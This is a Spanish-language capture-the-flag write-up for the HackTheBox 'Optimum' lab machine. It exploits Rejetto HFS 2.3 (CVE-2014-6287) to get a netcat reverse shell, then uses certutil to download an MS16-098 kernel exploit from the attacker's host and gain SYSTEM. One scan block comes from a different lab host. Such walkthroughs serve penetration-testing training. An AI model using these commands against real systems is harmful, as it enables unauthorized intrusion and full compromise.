# Optimum

<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Optimum.png" alt="Optimum" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
      </ul>
    </td>
  </tr>
</table>

## Reconocimiento inicial
Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.98 -oG allports
```

```shell
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

Vamos a realizar un escaneo más exaustivo de los siguiente puertos encontrados:


```shell
nmap -p80 -sV -Pn -T4 --script "http-enum,http-title,http-methods,http-headers,http-robots.txt,http-vhosts,http-slowloris-check,http-enum,vuln" -oN nmap_http 10.10.10.8 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 06:16 EST
Stats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.65% done; ETC: 06:20 (0:00:01 remaining)
Nmap scan report for 10.10.10.8
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://www.securityfocus.com/bid/49303
|_http-server-header: HFS 2.3
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vhosts: 
| 13 names had status ERROR
|_115 names had status 200
|_http-title: HFS /
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       http://capec.mitre.org/data/definitions/274.html
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|       http://www.mkit.com.ar/labs/htexploit/
|_      https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-headers: 
|   Content-Type: text/html
|   Content-Length: 3836
|   Accept-Ranges: bytes
|   Server: HFS 2.3
|   Set-Cookie: HFS_SID=0.136308107990772; path=/; 
|   Cache-Control: no-cache, no-store, must-revalidate, max-age=-1
|   
|_  (Request type: HEAD)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
Service Info: OS: Windows; CPE: cpe:/o:microsoft:window
```

```shell
http://10.10.11.92 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.92], RedirectLocation[http://conversor.htb/], Title[301 Moved Permanently]    
http://conversor.htb/ [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.92], RedirectLocation[/login], Title[Redirecting...]                            
http://conversor.htb/login [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.92], PasswordField[password], Title[Login]
```

## Intrusion 


```shell
searchsploit HFS 2.3                   
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                          | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                          | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                               | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                       | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                  | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                  | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                             | windows/webapps/34852.txt

```


```shell
searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
Copied to: /home/kali/39161.py
```

```shell
ip_addr = "10.10.14.47" #local IP address
local_port = "443" # Local Port number
```

```shell
python2 39161.py 10.10.10.8 80
```

```shell
python3 -m http.server 80                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [06/Nov/2025 07:07:18] "GET / HTTP/1.1" 200 -
10.10.10.8 - - [06/Nov/2025 07:07:53] "GET /nc.exe HTTP/1.1" 200 -
```

```shell
nc -lvnp 443 

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>

```

## Escalada de privilegios 

```shell
C:\Users\kostas\Desktop>whoami /priv

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```



```shell
C:\Users\kostas\Desktop>net user kostas
net user kostas
User name                    kostas
Full Name                    kostas
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 1:56:19 ��
Password expires             Never
Password changeable          18/3/2017 1:56:19 ��
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/11/2025 10:12:07 ��

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

```shell
C:\Users\kostas\Desktop>system info
system info
'system' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\kostas\Desktop>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          12/11/2025, 10:11:55 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.430 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.931 MB
Virtual Memory: In Use:    572 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed. 
```

```shell
python2.7 windows-exploit-suggester.py --update
```

```shell
python2.7 windows-exploit-suggester.py -d 2025-11-06-mssb.xls -i systeminfo.txt
```

```shell
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
```

```shell
C:\Windows\Temp\Privilege>certutil.exe -f -urlcache -split http://10.10.14.47:80/41020.exe privesc.exe
```

```shell
C:\Windows\Temp\Privilege>privesc.exe

C:\Windows\Temp\Privilege>whoami
whoami
nt authority\system
```